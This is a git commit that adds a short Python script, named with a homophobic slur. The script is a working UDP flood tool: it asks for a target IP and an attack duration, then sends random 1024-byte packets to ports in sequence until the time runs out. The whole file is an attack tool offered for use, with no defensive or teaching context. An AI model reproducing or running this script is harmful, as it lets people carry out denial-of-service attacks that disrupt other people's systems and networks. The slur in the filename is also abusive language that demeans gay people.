9e7c0e59afa50fecc00a40374178c1296ce73599
Jurrikah <52750167+Jurrikah@users.noreply.github.com>
2020-02-04 03:13:24 +1000

    Add files via upload

---
+++ gaybitch.py
@@ -0,0 +1,28 @@
+import random
+import sys
+import os
+import socket
+import time
+
+os.system("cls")
+port = 80
+ip = input("\nEnter IP: ")
+dur = int(input("\nEnter duration of attack: "))
+bytes = os.urandom(1024)
+socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sent = int(0)
+timeout = time.time()+dur
+while 1 == 1:
+    try:
+        if time.time()>timeout:
+            sys.exit()
+        else:
+            socket.sendto(bytes,(ip,port))
+            sent = sent+1
+            if port == 65535:
+                port = 1
+            else:
+                port = port+1
+                print(sent,ip,port)
+    except KeyboardInterrupt:
+        sys.exit()
